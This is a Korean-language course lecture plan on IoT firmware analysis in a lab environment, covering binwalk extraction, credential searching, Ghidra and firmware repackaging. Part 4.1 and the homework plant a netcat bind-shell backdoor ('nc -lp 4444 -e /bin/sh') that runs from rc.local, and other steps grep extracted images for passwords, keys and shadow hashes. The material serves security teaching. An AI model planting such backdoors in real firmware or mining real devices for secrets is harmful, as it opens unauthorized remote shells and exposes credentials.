# Week 04: 펌웨어 분석

## 학습 목표
- IoT 펌웨어의 구조와 포맷을 이해한다
- binwalk를 이용한 펌웨어 분석 및 추출 기법을 익힌다
- firmware-mod-kit으로 펌웨어를 수정하고 재패키징한다
- 펌웨어에서 민감 정보를 추출하는 기법을 학습한다
- 펌웨어 리버스 엔지니어링 기초를 실습한다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| attacker | 10.20.30.201 | 공격/분석 머신 | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | IoT 서비스 호스트 | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh) | `ssh ccc@10.20.30.100` |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 펌웨어 구조 이론 (Part 1) | 강의 |
| 0:40-1:10 | 리버스 엔지니어링 심화 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | binwalk 분석 실습 (Part 3) | 실습 |
| 2:00-2:40 | 펌웨어 수정 및 민감 정보 추출 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | Ghidra 리버싱 기초 (Part 5) | 실습 |
| 3:20-3:40 | 정리 + 과제 안내 | 정리 |

---

## Part 1: 펌웨어 구조 이론 (40분)

### 1.1 펌웨어란

펌웨어(Firmware)는 하드웨어에 내장된 소프트웨어로, IoT 디바이스의 운영체제, 애플리케이션, 설정을 포함한다.

**펌웨어 획득 방법:**
1. **제조사 웹사이트:** 업데이트 파일 다운로드
2. **OTA 캡처:** 업데이트 트래픽 가로채기
3. **하드웨어 추출:** SPI/JTAG를 통한 Flash 덤프
4. **UART 쉘:** 실행 중인 시스템에서 복사
5. **모바일 앱 분석:** 앱 내 펌웨어 파일 추출

### 1.2 펌웨어 이미지 구조

```
┌──────────────────────────────────┐
│        Boot Header               │ ← 매직 바이트, CRC
├──────────────────────────────────┤
│        Bootloader (U-Boot)       │ ← 시스템 초기화
├──────────────────────────────────┤
│        Kernel (Linux)            │ ← 운영체제 커널
├──────────────────────────────────┤
│        Root Filesystem           │ ← SquashFS, JFFS2, CramFS
│  ┌──────────────────────────┐   │
│  │ /bin  /etc  /lib  /usr   │   │
│  │ /sbin /var  /www  /tmp   │   │
│  └──────────────────────────┘   │
├──────────────────────────────────┤
│        Configuration             │ ← NVRAM, 설정 데이터
└──────────────────────────────────┘
```

### 1.3 주요 파일시스템

| 파일시스템 | 매직 바이트 | 특성 |
|-----------|------------|------|
| SquashFS | hsqs / sqsh | 읽기 전용, 압축, 가장 일반적 |
| JFFS2 | 0x1985 | NOR Flash용, 읽기/쓰기 |
| CramFS | 0x28cd3d45 | 읽기 전용, 압축 |
| UBIFS | UBI# | NAND Flash용 |
| ext4 | 0xEF53 | 범용 Linux |
| YAFFS2 | - | NAND Flash용 |

### 1.4 압축/암호화 포맷

| 포맷 | 매직 바이트 | 설명 |
|------|-----------|------|
| gzip | 1f 8b | GNU 압축 |
| bzip2 | BZ | bzip2 압축 |
| lzma | 5d 00 00 | LZMA 압축 |
| xz | fd 37 7a 58 5a | xz 압축 |
| uImage | 27 05 19 56 | U-Boot 이미지 헤더 |
| ELF | 7f 45 4c 46 | 실행 파일 |
| AES | - | 암호화 (매직 없음) |

---

## Part 2: 리버스 엔지니어링 심화 (30분)

### 2.1 ARM 아키텍처 기초

대부분의 IoT 디바이스는 ARM 프로세서를 사용한다.

**ARM 레지스터:**
```
R0-R3:  함수 인자/반환값
R4-R11: 범용 레지스터 (callee-saved)
R12:    IP (Intra-Procedure call scratch)
R13:    SP (Stack Pointer)
R14:    LR (Link Register, 리턴 주소)
R15:    PC (Program Counter)
CPSR:   상태 레지스터
```

**ARM 명령어 예시:**
```asm
; 함수 프롤로그
PUSH {R4-R7, LR}      ; 레지스터 저장
SUB  SP, SP, #0x10     ; 스택 할당

; 비밀번호 비교 함수 (취약한 구현)
LDR  R0, =password_buf  ; 사용자 입력
LDR  R1, =hardcoded_pwd ; 하드코딩된 비밀번호
BL   strcmp              ; 문자열 비교
CMP  R0, #0             ; 결과 확인
BEQ  auth_success        ; 0이면 인증 성공

; 함수 에필로그
POP  {R4-R7, PC}        ; 레지스터 복원, 리턴
```

### 2.2 MIPS 아키텍처 기초

라우터, 카메라 등에서 MIPS가 사용된다.

```asm
; MIPS 함수 호출 규약
$a0-$a3: 함수 인자
$v0-$v1: 반환값
$ra:     리턴 주소
$sp:     스택 포인터

; 예시: 백도어 확인 코드
lw    $a0, 0($sp)         ; 사용자명 로드
la    $a1, backdoor_user   ; "admin_debug"
jal   strcmp               ; 비교
beqz  $v0, grant_access    ; 일치하면 접근 허용
```

---

## Part 3: binwalk 분석 실습 (40분)

### 3.1 가상 펌웨어 생성

```bash
# 분석용 가상 펌웨어 이미지 생성
cat << 'BASH' > /tmp/create_firmware.sh
#!/bin/bash
set -e

WORK_DIR=/tmp/firmware_lab
mkdir -p $WORK_DIR/rootfs/{bin,etc,lib,www,tmp,var/log}

# /etc 설정 파일
cat > $WORK_DIR/rootfs/etc/passwd << 'EOF'
root:$1$xyz$hash123:0:0:root:/root:/bin/sh
admin:$1$abc$hash456:1000:1000:Admin:/home/admin:/bin/sh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
EOF

cat > $WORK_DIR/rootfs/etc/shadow << 'EOF'
root:$6$rounds=5000$saltsalt$longhashhere:18000:0:99999:7:::
admin:$6$rounds=5000$anothersalt$anotherhash:18000:0:99999:7:::
EOF

# 하드코딩된 인증 정보 (취약점)
cat > $WORK_DIR/rootfs/etc/config.ini << 'EOF'
[mqtt]
broker_host=10.20.30.80
broker_port=1883
username=iot_device
password=IoTPassw0rd!

[cloud]
api_url=https://api.iot-cloud.com
api_key=sk-iot-1234567890abcdef
secret=MyCloudSecret2024

[wifi]
ssid=Factory-IoT
psk=FactoryWiFi@2024
encryption=WPA2
EOF

# 웹 인터페이스
cat > $WORK_DIR/rootfs/www/index.html << 'EOF'
<html><head><title>IoT Dashboard</title></head>
<body><h1>IoT Gateway Dashboard</h1>
<script>var API_KEY="hardcoded_api_key_12345";</script>
</body></html>
EOF

# 인증서/키 (취약점)
mkdir -p $WORK_DIR/rootfs/etc/ssl
openssl req -new -x509 -days 365 -nodes \
  -keyout $WORK_DIR/rootfs/etc/ssl/server.key \
  -out $WORK_DIR/rootfs/etc/ssl/server.crt \
  -subj "/CN=iot-gateway" 2>/dev/null

# SquashFS 이미지 생성
sudo apt install -y squashfs-tools 2>/dev/null || true
mksquashfs $WORK_DIR/rootfs $WORK_DIR/rootfs.sqsh -noappend -comp gzip 2>/dev/null

# 펌웨어 이미지 조립
dd if=/dev/zero of=$WORK_DIR/firmware.bin bs=1M count=4 2>/dev/null

# 부트 헤더
printf '\x27\x05\x19\x56' | dd of=$WORK_DIR/firmware.bin bs=1 seek=0 conv=notrunc 2>/dev/null
printf 'U-Boot 2020.04 IoT-GW\x00' | dd of=$WORK_DIR/firmware.bin bs=1 seek=4 conv=notrunc 2>/dev/null

# SquashFS 삽입
if [ -f $WORK_DIR/rootfs.sqsh ]; then
  dd if=$WORK_DIR/rootfs.sqsh of=$WORK_DIR/firmware.bin bs=1 seek=524288 conv=notrunc 2>/dev/null
fi

echo "[+] 가상 펌웨어 생성 완료: $WORK_DIR/firmware.bin"
ls -lh $WORK_DIR/firmware.bin
BASH

chmod +x /tmp/create_firmware.sh
bash /tmp/create_firmware.sh
```

### 3.2 binwalk 분석

```bash
# binwalk 설치
sudo apt install -y binwalk

# 엔트로피 분석 (암호화 여부 확인)
binwalk -E /tmp/firmware_lab/firmware.bin

# 시그니처 스캔
binwalk /tmp/firmware_lab/firmware.bin

# 파일시스템 추출
binwalk -e /tmp/firmware_lab/firmware.bin -C /tmp/firmware_extracted/

# 재귀적 추출
binwalk -Me /tmp/firmware_lab/firmware.bin -C /tmp/firmware_deep/

# 결과 확인
find /tmp/firmware_extracted/ -type f | head -30
```

### 3.3 민감 정보 검색

```bash
# 추출된 파일시스템에서 민감 정보 검색
EXTRACTED="/tmp/firmware_extracted"

# 비밀번호/키 검색
grep -r -i "password\|passwd\|secret\|api_key\|psk\|credential" $EXTRACTED/ 2>/dev/null

# 하드코딩된 IP/URL 검색
grep -r -oE "https?://[a-zA-Z0-9./?=_-]+" $EXTRACTED/ 2>/dev/null
grep -r -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $EXTRACTED/ 2>/dev/null

# 인증서/키 파일 검색
find $EXTRACTED/ -name "*.pem" -o -name "*.key" -o -name "*.crt" 2>/dev/null

# shadow 파일 해시 추출
find $EXTRACTED/ -name "shadow" -exec cat {} \; 2>/dev/null

# SSH 키 검색
find $EXTRACTED/ -name "id_rsa*" -o -name "authorized_keys" 2>/dev/null

# strings를 이용한 추가 분석
strings /tmp/firmware_lab/firmware.bin | grep -iE "(user|pass|key|secret|token)" | head -20
```

---

## Part 4: 펌웨어 수정 및 리패키징 (40분)

### 4.1 firmware-mod-kit 사용

```bash
# firmware-mod-kit 설치
git clone https://github.com/rampageX/firmware-mod-kit.git /tmp/fmk 2>/dev/null || true

# 또는 수동으로 SquashFS 수정
mkdir -p /tmp/fw_modified
cp -r /tmp/firmware_lab/rootfs/* /tmp/fw_modified/

# 백도어 추가 (교육 목적)
cat > /tmp/fw_modified/etc/backdoor.sh << 'EOF'
#!/bin/sh
# 교육용 백도어 시뮬레이션
nc -lp 4444 -e /bin/sh &
EOF
chmod +x /tmp/fw_modified/etc/backdoor.sh

# rc.local에 자동 실행 추가
cat > /tmp/fw_modified/etc/rc.local << 'EOF'
#!/bin/sh
/etc/backdoor.sh
exit 0
EOF

# 수정된 SquashFS 재패키징
mksquashfs /tmp/fw_modified /tmp/rootfs_modified.sqsh \
  -noappend -comp gzip 2>/dev/null

echo "[+] 수정된 펌웨어 패키징 완료"
ls -lh /tmp/rootfs_modified.sqsh
```

### 4.2 비밀번호 해시 크래킹

```bash
# shadow 파일에서 해시 추출
cat << 'EOF' > /tmp/iot_hashes.txt
root:$6$rounds=5000$saltsalt$longhashhere:18000:0:99999:7:::
admin:$1$abc$hash456:18000:0:99999:7:::
EOF

# hashcat 또는 john으로 크래킹
# john /tmp/iot_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# IoT 공통 비밀번호 사전
cat << 'EOF' > /tmp/iot_passwords.txt
admin
root
password
1234
12345678
admin123
default
guest
support
user
EOF
```

### 4.3 펌웨어 비교 (diff)

```bash
# 두 버전의 펌웨어 비교
cat << 'PYEOF' > /tmp/fw_diff.py
#!/usr/bin/env python3
"""펌웨어 버전 비교 분석"""
import hashlib
import os

def hash_file(path):
    h = hashlib.sha256()
    with open(path, 'rb') as f:
        for chunk in iter(lambda: f.read(8192), b''):
            h.update(chunk)
    return h.hexdigest()

def compare_dirs(dir1, dir2):
    print(f"=== 펌웨어 비교: {dir1} vs {dir2} ===\n")
    
    files1 = set()
    for root, dirs, files in os.walk(dir1):
        for f in files:
            rel = os.path.relpath(os.path.join(root, f), dir1)
            files1.add(rel)
    
    files2 = set()
    for root, dirs, files in os.walk(dir2):
        for f in files:
            rel = os.path.relpath(os.path.join(root, f), dir2)
            files2.add(rel)
    
    added = files2 - files1
    removed = files1 - files2
    common = files1 & files2
    
    if added:
        print("[+] 추가된 파일:")
        for f in sorted(added):
            print(f"  + {f}")
    
    if removed:
        print("[-] 제거된 파일:")
        for f in sorted(removed):
            print(f"  - {f}")
    
    modified = []
    for f in sorted(common):
        p1 = os.path.join(dir1, f)
        p2 = os.path.join(dir2, f)
        if os.path.isfile(p1) and os.path.isfile(p2):
            if hash_file(p1) != hash_file(p2):
                modified.append(f)
    
    if modified:
        print("[~] 변경된 파일:")
        for f in modified:
            print(f"  ~ {f}")

compare_dirs('/tmp/firmware_lab/rootfs', '/tmp/fw_modified')
PYEOF

python3 /tmp/fw_diff.py
```

---

## Part 5: Ghidra 리버싱 기초 (30분)

### 5.1 Ghidra 소개

Ghidra는 NSA가 개발한 오픈소스 리버스 엔지니어링 도구이다.

**Ghidra 주요 기능:**
- 디스어셈블러 (ARM, MIPS, x86 등)
- 디컴파일러 (C 코드 복원)
- 바이너리 비교
- 스크립트 자동화 (Python/Java)

### 5.2 펌웨어 바이너리 분석

```bash
# 간단한 ARM 바이너리 분석 (교육용)
cat << 'PYEOF' > /tmp/analyze_binary.py
#!/usr/bin/env python3
"""간단한 바이너리 분석 도구"""
import struct
import sys

def analyze_elf(filepath):
    with open(filepath, 'rb') as f:
        magic = f.read(4)
        if magic != b'\x7fELF':
            print("[-] ELF 파일이 아닙니다")
            return
        
        ei_class = struct.unpack('B', f.read(1))[0]
        ei_data = struct.unpack('B', f.read(1))[0]
        
        print("=== ELF 분석 ===")
        print(f"클래스: {'32-bit' if ei_class == 1 else '64-bit'}")
        print(f"엔디안: {'Little' if ei_data == 1 else 'Big'}")
        
        f.seek(18)
        e_machine = struct.unpack('<H', f.read(2))[0]
        machines = {3: 'x86', 8: 'MIPS', 40: 'ARM', 62: 'x86-64', 183: 'AArch64'}
        print(f"아키텍처: {machines.get(e_machine, f'Unknown ({e_machine})')}")

def find_strings(filepath, min_len=8):
    print(f"\n=== 문자열 분석 (>={min_len}자) ===")
    with open(filepath, 'rb') as f:
        data = f.read()
    
    current = b''
    interesting = []
    for byte in data:
        if 32 <= byte < 127:
            current += bytes([byte])
        else:
            if len(current) >= min_len:
                s = current.decode('ascii')
                if any(kw in s.lower() for kw in ['pass', 'key', 'secret', 'admin', 'root', 'login', 'auth']):
                    interesting.append(s)
            current = b''
    
    for s in interesting[:20]:
        print(f"  [!] {s}")

# 분석 실행
filepath = '/tmp/firmware_lab/firmware.bin'
find_strings(filepath)
PYEOF

python3 /tmp/analyze_binary.py
```

### 5.3 Ghidra 스크립트 자동화

```python
# Ghidra Headless 분석 예시 (참고)
# analyzeHeadless /tmp/ghidra_project IoT_FW \
#   -import /tmp/firmware_extracted/usr/bin/httpd \
#   -postScript FindCrypto.py

# 취약 함수 탐지 스크립트 (Ghidra Python)
"""
dangerous_funcs = ['strcpy', 'strcat', 'sprintf', 'gets', 'scanf']
for func_name in dangerous_funcs:
    func = getGlobalFunctions(func_name)
    if func:
        refs = getReferencesTo(func[0].getEntryPoint())
        print(f"[!] {func_name}: {len(list(refs))} references")
"""
```

---

## Part 6: 과제 안내 (20분)

### 과제

- 가상 펌웨어를 binwalk로 분석하여 파일시스템을 추출하시오
- 추출된 파일시스템에서 하드코딩된 인증 정보 5개 이상을 찾으시오
- 펌웨어에 백도어를 삽입하고 재패키징하시오 (교육 목적)

---

## 참고 자료

- binwalk: https://github.com/ReFirmLabs/binwalk
- Ghidra: https://ghidra-sre.org/
- firmware-mod-kit: https://github.com/rampageX/firmware-mod-kit
- "Practical IoT Hacking" (Fotios Chantzis 외)

---

## 실제 사례 (WitFoo Precinct 6)

> **출처**: [WitFoo Precinct 6 Cybersecurity Dataset](https://huggingface.co/datasets/witfoo/precinct6-cybersecurity) (Apache 2.0)
> **익명화**: RFC5737 TEST-NET / ORG-NNNN / HOST-NNNN 으로 sanitized

본 주차 (4주차) 학습 주제와 직접 연관된 *실제* incident:

### Data Theft (T1041) — 99.99% 의 dataset 패턴

> **출처**: WitFoo Precinct 6 / `complete-mission cluster` (anchor: `anc-a0364e702393`) · sanitized
> **시점**: 다중 (전체 99.99%)

**관찰**: Precinct 6 의 incident 10,442건 중 mo_name=Data Theft + lifecycle=complete-mission 이 99.99%. T1041 (Exfiltration over C2 Channel).

**MITRE ATT&CK**: **T1041 (Exfiltration over C2 Channel)**

**IoC**:
  - `다양한 src→dst (sanitized)`
  - `suspicion≥0.7`

**학습 포인트**:
- *가장 많이 일어나는 공격* 의 baseline — 모든 IR 시나리오의 출발점
- C2 채널 (HTTP/HTTPS/DNS) 에 데이터 mixed → 정상 트래픽 위장
- 탐지: outbound 에 데이터 흐름 모니터링 (bytes_out 분포), CTI feed 매칭
- 방어: DLP (Data Loss Prevention), egress filter, 데이터 분류·암호화


**본 강의와의 연결**: 위 사례는 강의의 핵심 개념이 어떻게 *실제 운영 환경*에서 일어나는지 보여준다. 학생은 이 패턴을 (1) 공격자 입장에서 재현 가능한가 (2) 방어자 입장에서 탐지 가능한가 (3) 자기 인프라에서 동일 신호가 있는지 검색 가능한가 — 3 관점에서 평가한다.

---

> 더 많은 사례 (총 5 anchor + 외부 표준 7 source) 는 KG (Knowledge Graph) 페이지에서 검색 가능.
> Cyber Range 실습 중 학습 포인트 박스 (📖) 에 동일 anchor 가 자동 노출된다.
